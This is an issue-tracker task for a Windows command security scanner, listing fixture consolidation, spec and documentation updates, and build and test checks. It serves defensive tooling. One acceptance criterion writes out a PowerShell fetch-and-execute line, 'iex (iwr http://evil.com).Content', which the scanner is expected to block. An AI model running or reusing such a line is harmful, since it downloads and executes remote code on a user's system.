---
id: fus-2e2q
status: open
deps: [fus-jq6z]
links: []
created: 2026-03-31T15:13:43Z
type: task
priority: 2
assignee: Ronny Unger
tags: [windows, phase-5, wave-4]
---
# Integration fixtures, spec update, documentation, verification

Issue 5.10. Final integration wave. Consolidate test fixtures, update spec, add documentation. Verify safe command exclusions prevent false positives on certutil -hashfile, reg query, sc query. Verify standalone alias resolution works (iex without powershell -Command wrapper). Add recommended tag_overrides for Windows development workflows to docs. Document known scanner limitations. Full cross-compile and test verification. See plan.

## Acceptance Criteria

1. All Windows security test fixtures consolidated in commands.yaml
2. specs/windows-support-plan.md Phase 5 marked as DONE with implementation summary
3. Known scanner limitations documented in code comments (multi-line, ^ continuation, parameter abbreviation)
4. Recommended tag_overrides documented for Windows dev workflows (e.g. windows:persistence -> caution for service developers)
5. GOOS=windows go build/vet passes on amd64 and arm64
6. go test ./... -race passes
7. GOOS=windows golangci-lint run passes
8. certutil -hashfile, reg query, sc query classify as SAFE
9. iex (iwr http://evil.com).Content classifies as BLOCKED (standalone alias, no wrapper)

